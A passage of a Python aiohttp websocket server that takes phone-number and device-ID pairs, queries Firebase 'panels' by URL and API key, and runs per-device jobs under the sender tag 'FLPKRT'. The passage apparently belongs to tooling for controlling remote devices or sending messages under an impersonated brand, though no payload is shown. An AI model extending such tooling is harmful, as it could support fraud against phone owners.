                await emit_to_all('error', {'message': f'No phone found for device {device}.'})
        else:
            parts = re.split(r'[,\s]+', line.strip())
            if len(parts) >= 2:
                phone = re.sub(r'\D', '', parts[0])
                device = parts[1]
                if not phone:
                    for panel in panels:
                        phone = fetch_phone_from_device_id(panel, device)
                        if phone:
                            break
                    if not phone:
                        await emit_to_all('error', {'message': f'No phone found for device {device}.'})
                        continue
                if len(phone) == 10:
                    tasks.append((phone, device, panels[0]))
                else:
                    await emit_to_all('error', {'message': f'Invalid phone: {parts[0]}'})
            else:
                device = line.strip()
                phone = None
                for panel in panels:
                    phone = fetch_phone_from_device_id(panel, device)
                    if phone:
                        break
                if phone:
                    tasks.append((phone, device, panels[0]))
                else:
                    await emit_to_all('error', {'message': f'Could not parse line: {line}'})

    if not tasks:
        await emit_to_all('error', {'message': 'No valid phone/device pairs.'})
        return

    await emit_to_all('processing_started', {'total': len(tasks)})

    sem = asyncio.Semaphore(MAX_CONCURRENT)
    async def run_with_sem(phone, device, panel, idx, total):
        async with sem:
            # Determine which JSON to use for this device
            key = f"{device}_{phone}"
            json_to_use = per_device_json.get(key, global_json)  # per-device overrides global
            await process_one(phone, device, panel, idx, total, is_single=False, json_data=json_to_use)

    for idx, (phone, device, panel) in enumerate(tasks):
        task = asyncio.create_task(run_with_sem(phone, device, panel, idx, len(tasks)))
        active_tasks.append(task)
        task.add_done_callback(lambda t: active_tasks.remove(t) if t in active_tasks else None)

async def handle_start_single(data, ws):
    panels_data = data.get('panels', [])
    phone = data.get('phone', '')
    device = data.get('device', '')
    mode = data.get('mode', 'full')
    global_json = data.get('json_data', None)
    per_device_json = data.get('per_device_json', {})
    if not phone or not device:
        await emit_to_all('error', {'message': 'Phone and device required'})
        return

    panels = []
    for link in panels_data:
        parsed = parse_panel_link(link)
        if parsed:
            firebase_url, api_key = parsed
            name = firebase_url.replace("https://", "").replace("http://", "").split('.')[0]
            if not name:
                name = f"Panel_{len(panels)+1}"
            panels.append({"name": name, "url": firebase_url, "sender": "FLPKRT"})
        else:
            await emit_to_all('error', {'message': f'Could not parse panel link: {link[:50]}...'})

    if not panels:
        await emit_to_all('error', {'message': 'No valid panels provided.'})
        return

    panel = panels[0]
    device_key = f"{device}_{phone}"

    for task in active_tasks:
        if not task.done() and hasattr(task, '_coro') and device_key in str(task._coro):
            task.cancel()
    if device_key in task_inputs:
        try:
            task_inputs[device_key].set_result(None)
        except:
            pass
        del task_inputs[device_key]

    json_to_use = per_device_json.get(device_key, global_json)
    task = asyncio.create_task(process_one(phone, device, panel, 1, 1, is_single=True, json_data=json_to_use))
    active_tasks.append(task)
    task.add_done_callback(lambda t: active_tasks.remove(t) if t in active_tasks else None)

async def handle_stop_single(data, ws):
    device_key = data.get('device')
    if not device_key:
        return
    if device_key in task_inputs:
        try:
            task_inputs[device_key].set_result(None)
        except:
            pass
        del task_inputs[device_key]
    await emit_to_all('status', {'device': device_key, 'status': 'cancelled', 'message': 'Stopped by user'})

async def index(request):
    html = open('templates/index.html', 'r').read()
    return web.Response(text=html, content_type='text/html')

app = web.Application()
app.router.add_get('/', index)
app.router.add_get('/ws', ws_handler)

if __name__ == '__main__':
    web.run_app(app, host='0.0.0.0', port=5002)